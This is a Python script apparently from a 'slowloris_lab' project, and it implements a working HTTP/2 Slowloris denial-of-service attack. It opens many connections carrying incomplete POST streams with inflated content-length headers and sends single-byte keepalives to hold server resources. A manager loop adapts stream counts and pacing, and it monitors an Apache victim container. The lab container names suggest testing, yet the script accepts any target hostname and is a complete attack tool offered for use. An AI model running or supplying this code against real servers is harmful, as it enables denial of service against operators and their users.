# slowloris_lab/advanced_slowloris.py - Raw HTTP/2 Version

import socket
import ssl
import asyncio
import threading
import time
import random
import sys
import argparse
import h2.connection
import h2.events
import h2.config
import subprocess
import os

# A global threading.Event to signal all worker threads to stop gracefully.
stop_event = threading.Event()

class AttackState:
    """
    A thread-safe class to hold and update the attack's dynamic settings.
    This allows the main manager thread to communicate changes (like the sleep interval)
    to all the active worker threads.
    """
    def __init__(self, sleep_interval, streams_per_connection):
        # The current sleep interval that workers should use.
        self.sleep_interval = sleep_interval
        self.streams_per_connection = streams_per_connection
        # A lock to prevent race conditions when multiple threads access the sleep_interval.
        self.lock = threading.Lock()
        self.last_pressure_increase = time.time()

    def get_sleep(self):
        """Safely gets the current sleep interval."""
        with self.lock:
            return self.sleep_interval

    def set_sleep(self, new_interval):
        """Safely updates the sleep interval if it has changed."""
        with self.lock:
            if self.sleep_interval != new_interval:
                print(f"[!] Pace changed: Keep-alive interval now ~{new_interval}s")
                self.sleep_interval = new_interval
    
    def get_streams_per_connection(self):
        """Safely gets the current streams per connection."""
        with self.lock:
            return self.streams_per_connection
    
    def set_streams_per_connection(self, new_streams):
        """Safely updates streams per connection."""
        with self.lock:
            if self.streams_per_connection != new_streams:
                print(f"[!] Stream count changed: {new_streams} streams per connection")
                self.streams_per_connection = new_streams

class HTTP2ConnectionWorker(threading.Thread):
    """
    A dedicated thread to manage a raw HTTP/2 connection with multiple slow streams.
    It creates a connection and maintains multiple incomplete requests using h2 library.
    """
    def __init__(self, target_ip, attack_state, connection_id):
        super().__init__()
        self.target_ip = target_ip
        self.attack_state = attack_state
        self.connection_id = connection_id
        self.sock = None
        self.conn = None
        self.active_streams = {}
        self.next_stream_id = 1
        
    def run(self):
        """The main logic for the HTTP/2 connection worker."""
        try:
            self.connect_and_attack()
        except Exception as e:
            print(f"[!] Connection {self.connection_id} failed: {e}")
        finally:
            if self.sock:
                self.sock.close()
    
    def connect_and_attack(self):
        """Establish HTTP/2 connection with retry and better error handling."""
        retry_count = 0
        max_retries = 5
        
        while not stop_event.is_set() and retry_count < max_retries:
            try:
                # Create socket connection with longer timeout
                self.sock = socket.create_connection((self.target_ip, 80), timeout=45)
                self.sock.settimeout(2.0)  # Longer timeout to reduce broken pipes
                
                # Create HTTP/2 connection
                config = h2.config.H2Configuration(client_side=True)
                self.conn = h2.connection.H2Connection(config=config)
                self.conn.initiate_connection()
                
                # Send connection preface
                self.sock.sendall(self.conn.data_to_send())
                
                print(f"[+] Connection {self.connection_id} established successfully")
                
                # Create initial slow streams
                self.create_initial_streams()
                
                # Main event loop with better error handling
                consecutive_errors = 0
                while not stop_event.is_set() and consecutive_errors < 10:
                    try:
                        # Handle incoming data
                        data = self.sock.recv(65535)
                        if not data:
                            print(f"[!] Connection {self.connection_id} closed by server")
                            break
                            
                        events = self.conn.receive_data(data)
                        self.handle_events(events)
                        
                        # Send any pending data
                        data_to_send = self.conn.data_to_send()
                        if data_to_send:
                            self.sock.sendall(data_to_send)
                            
                        consecutive_errors = 0  # Reset error count on success
                        
                    except socket.timeout:
                        # Timeout is expected, continue
                        pass
                    except (ConnectionResetError, BrokenPipeError) as e:
                        print(f"[!] Connection {self.connection_id} broken: {e} - will retry")
                        consecutive_errors += 1
                        time.sleep(1)  # Brief pause before retry
                        break  # Break inner loop to reconnect
                    except Exception as e:
                        print(f"[!] Connection {self.connection_id} error: {e}")
                        consecutive_errors += 1
                        time.sleep(1)
                        
                    # Maintain streams with CPU efficiency
                    self.maintain_incomplete_streams()
                    time.sleep(random.uniform(3, 8))  # Balanced intervals
                    
                # Connection failed, increment retry count
                retry_count += 1
                if retry_count < max_retries:
                    wait_time = retry_count * 2  # Exponential backoff
                    print(f"[!] Connection {self.connection_id} retry {retry_count}/{max_retries} in {wait_time}s")
                    time.sleep(wait_time)
                    
            except Exception as e:
                retry_count += 1
                print(f"[!] Connection {self.connection_id} failed to establish: {e} (retry {retry_count}/{max_retries})")
                time.sleep(retry_count * 2)  # Exponential backoff
                
        print(f"[!] Connection {self.connection_id} gave up after {max_retries} retries")
    
    def create_initial_streams(self):
        """Create initial set of incomplete HTTP/2 streams."""
        streams_count = self.attack_state.get_streams_per_connection()
        
        for i in range(min(streams_count, 50)):  # Reasonable stream count to avoid limits
            self.create_incomplete_stream()
            time.sleep(0.05)  # Slightly slower to reduce CPU load
    
    def create_incomplete_stream(self):
        """Create a single incomplete HTTP/2 stream."""
        if self.next_stream_id > 5000:  # Higher stream ID limit for more brutal attack
            # Reset stream ID counter to reuse old IDs
            self.next_stream_id = 1
            
        stream_id = self.next_stream_id
        self.next_stream_id += 2  # Client streams must be odd
        
        try:
            # Create headers for POST request with MASSIVE content-length
            headers = [
                (':method', 'POST'),
                (':path', f'/?conn_{self.connection_id}_stream_{stream_id}&data={random.randint(1000, 9999)}'),
                (':authority', self.target_ip),
                (':scheme', 'http'),
                ('content-type', 'application/x-www-form-urlencoded'),
                ('content-length', str(random.randint(1000000, 10000000))),  # 1-10MB to avoid timeouts
                ('expect', '100-continue'),  # Server must wait for body
                ('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
                ('connection', 'keep-alive'),
                ('cache-control', 'no-cache'),
            ]
            
            # Send headers (but no END_STREAM flag)
            self.conn.send_headers(stream_id, headers, end_stream=False)
            
            # Track this stream
            self.active_streams[stream_id] = {
                'created': time.time(),
                'data_sent': 0,
                'target_size': int(headers[5][1])  # content-length
            }
            
            # Send initial data to the socket
            data_to_send = self.conn.data_to_send()
            if data_to_send:
                self.sock.sendall(data_to_send)
                
        except Exception as e:
            print(f"[!] Failed to create stream {stream_id}: {e}")
    
    def maintain_incomplete_streams(self):
        """Maintain incomplete streams with minimal keepalives to prevent timeouts."""
        current_time = time.time()
        streams_to_remove = []
        
        for stream_id, stream_info in self.active_streams.items():
            try:
                # Check if stream is still valid in h2 connection
                if stream_id not in [s.stream_id for s in self.conn.streams.values()]:
                    streams_to_remove.append(stream_id)
                    continue
                
                stream_age = current_time - stream_info['created']
                
                # Send minimal keepalive data every 20-30 seconds to prevent timeout
                last_keepalive = stream_info.get('last_keepalive', stream_info['created'])
                if current_time - last_keepalive > random.uniform(20, 30):
                    try:
                        # Send just 1 byte to keep stream alive
                        keepalive_data = b'x'
                        self.conn.send_data(stream_id, keepalive_data, end_stream=False)
                        stream_info['last_keepalive'] = current_time
                        stream_info['data_sent'] += 1
                        
                        # Send to socket
                        data_to_send = self.conn.data_to_send()
                        if data_to_send:
                            self.sock.sendall(data_to_send)
                            
                    except Exception as e:
                        streams_to_remove.append(stream_id)
                        continue
                
                # Log long-lived streams (good sign)
                if stream_age > 120 and stream_age % 60 == 0:  # Every minute after 2 minutes
                    remaining = stream_info['target_size'] - stream_info.get('data_sent', 0)
                    print(f"[+] Stream {stream_id} alive for {stream_age:.0f}s, {remaining} bytes remaining")
                    
            except Exception as e:
                streams_to_remove.append(stream_id)
        
        # Remove dead streams and replace them
        for stream_id in streams_to_remove:
            self.active_streams.pop(stream_id, None)
        
        # Create replacement streams more conservatively
        target_streams = self.attack_state.get_streams_per_connection()
        current_streams = len(self.active_streams)
        
        if current_streams < target_streams:
            # Don't create too many at once to avoid hitting limits
            streams_to_create = min(3, target_streams - current_streams)
            if streams_to_create > 0:
                print(f"[+] Creating {streams_to_create} replacement streams")
                for _ in range(streams_to_create):
                    self.create_incomplete_stream()
                    time.sleep(0.1)  # Small delay between creation
    
    def handle_events(self, events):
        """Handle HTTP/2 events from server with detailed monitoring."""
        for event in events:
            if isinstance(event, h2.events.StreamEnded):
                # Stream was closed by server - THIS SHOULD NOT HAPPEN!
                stream_info = self.active_streams.get(event.stream_id, {})
                stream_age = time.time() - stream_info.get('created', time.time())
                print(f"[!] CRITICAL: Stream {event.stream_id} ended by server after {stream_age:.1f}s - attack failing!")
                self.active_streams.pop(event.stream_id, None)
                
            elif isinstance(event, h2.events.ResponseReceived):
                # Server sent response headers - THIS IS BAD!
                print(f"[!] CRITICAL: Stream {event.stream_id} got response headers - server processing request!")
                
            elif isinstance(event, h2.events.DataReceived):
                # Server sent response data - THIS IS VERY BAD!
                print(f"[!] CRITICAL: Stream {event.stream_id} got response data: {len(event.data)} bytes")
                
            elif isinstance(event, h2.events.StreamReset):
                # Stream was reset
                print(f"[+] Stream {event.stream_id} was reset by server (good - means it was overloaded)")
                self.active_streams.pop(event.stream_id, None)
                
            elif isinstance(event, h2.events.ConnectionTerminated):
                # Connection terminated
                print(f"[!] Connection {self.connection_id} terminated by server (server overload - good!)")
                break
                
            elif isinstance(event, h2.events.SettingsAcknowledged):
                # Normal HTTP/2 handshake
                pass
            else:
                # Debug any other events
                print(f"[?] Unknown event on connection {self.connection_id}: {type(event).__name__}")

def get_tcp_connection_count():
    """Get count of established TCP connections."""
    try:
        # Count established connections (state 01 in /proc/net/tcp)
        result = subprocess.run(['grep', '-c', ' 01 ', '/proc/net/tcp'], 
                              capture_output=True, text=True, timeout=2)
        return int(result.stdout.strip()) if result.returncode == 0 else 0
    except:
        return 0

def get_server_load():
    """Get basic server load indicators."""
    try:
        # Get load average
        with open('/proc/loadavg', 'r') as f:
            load_avg = f.read().split()[0]
        
        # Get memory usage
        with open('/proc/meminfo', 'r') as f:
            meminfo = f.read()
            mem_total = int([line for line in meminfo.split('\n') if 'MemTotal' in line][0].split()[1])
            mem_free = int([line for line in meminfo.split('\n') if 'MemFree' in line][0].split()[1])
            mem_used_pct = ((mem_total - mem_free) / mem_total) * 100
        
        return float(load_avg), mem_used_pct
    except:
        return 0.0, 0.0

def monitor_apache_health():
    """Monitor Apache process health on victim container."""
    try:
        result = subprocess.run(['docker', 'exec', 'loris-victim-apache-latest', 'ps', 'aux'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            apache_processes = [line for line in result.stdout.split('\n') if 'httpd' in line and 'defunct' not in line]
            return len(apache_processes)
        return 0
    except:
        return 0

def get_response_time_sample():
    """Get a quick response time sample from the server."""
    try:
        import subprocess
        result = subprocess.run(['curl', '-o', '/dev/null', '-s', '-w', '%{time_total}', 
                               'http://localhost:8080'], 
                              capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            return float(result.stdout.strip())
        return 0.0
    except:
        return 0.0

def main():
    """Parses arguments and manages the HTTP/2 attack."""
    parser = argparse.ArgumentParser(description="Advanced HTTP/2 Slowloris attack with raw h2 library.")
    parser.add_argument("hostname", help="The target server's hostname or IP address.")
    parser.add_argument("connections", type=int, help="The number of HTTP/2 connections to maintain.")
    parser.add_argument("--streams", type=int, default=15, help="Number of streams per connection (low to avoid limits).")
    parser.add_argument("--sleep", type=int, default=12, help="Initial maximum time between maintenance cycles.")
    
    args = parser.parse_args()
    
    # Create the shared state object
    attack_state = AttackState(args.sleep, args.streams)

    print(f"Starting advanced HTTP/2 Slowloris attack on {args.hostname}")
    print(f"Connections: {args.connections}, Streams per connection: {args.streams}")
    print("This attack uses raw HTTP/2 stream exhaustion with incomplete requests.")
    
    connection_workers = []
    
    try:
        # Main manager loop
        while not stop_event.is_set():
            # Prune dead connection workers
            num_before = len(connection_workers)
            connection_workers = [w for w in connection_workers if w.is_alive()]
            num_after = len(connection_workers)
            
            dropped_count = num_before - num_after
            
            # Dynamic adaptation logic - more aggressive
            active_connections = len(connection_workers)
            
            if dropped_count > (args.connections * 0.1):  # More than 10% dropped
                # Many connections failing, be more conservative
                new_sleep = min(20, attack_state.get_sleep() + 2)
                attack_state.set_sleep(new_sleep)
                
                # Reduce streams per connection to avoid limits
                new_streams = max(5, attack_state.get_streams_per_connection() - 2)
                attack_state.set_streams_per_connection(new_streams)
                
            elif dropped_count == 0 and active_connections >= args.connections * 0.8:
                # Most connections stable, slowly increase pressure
                if active_connections >= args.connections * 0.9:
                    # Very stable, can increase streams modestly
                    new_streams = min(args.streams + 10, attack_state.get_streams_per_connection() + 1)
                    attack_state.set_streams_per_connection(new_streams)
                    
            # Periodic minor adjustments
            if time.time() - attack_state.last_pressure_increase > 30:  # Every 30 seconds
                current_streams = attack_state.get_streams_per_connection()
                if current_streams < args.streams + 5:  # Don't go too high
                    attack_state.set_streams_per_connection(current_streams + 1)
                attack_state.last_pressure_increase = time.time()

            # Replenish connections
            while len(connection_workers) < args.connections:
                worker = HTTP2ConnectionWorker(args.hostname, attack_state, len(connection_workers))
                worker.start()
                connection_workers.append(worker)

            # Enhanced status update with server monitoring
            total_expected_streams = len(connection_workers) * attack_state.get_streams_per_connection()
            tcp_connections = get_tcp_connection_count()
            load_avg, mem_usage = get_server_load()
            
            # Sample server health every few cycles
            apache_procs = 0
            response_time = 0.0
            if len(connection_workers) % 5 == 0:  # Every 5th cycle
                apache_procs = monitor_apache_health()
                response_time = get_response_time_sample()
            
            print(f"[*] Conn: {len(connection_workers)}/{args.connections} | "
                  f"Streams: {total_expected_streams} | Drop: {dropped_count} | "
                  f"Pace: {attack_state.get_sleep()}s | TCP: {tcp_connections} | "
                  f"Load: {load_avg:.1f} | Mem: {mem_usage:.1f}% | "
                  f"Apache: {apache_procs} | RT: {response_time:.3f}s")
            
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user. Shutting down...")
        stop_event.set()
        for worker in connection_workers:
            worker.join(timeout=5)
        print("[*] All connections terminated.")

if __name__ == "__main__":
    main()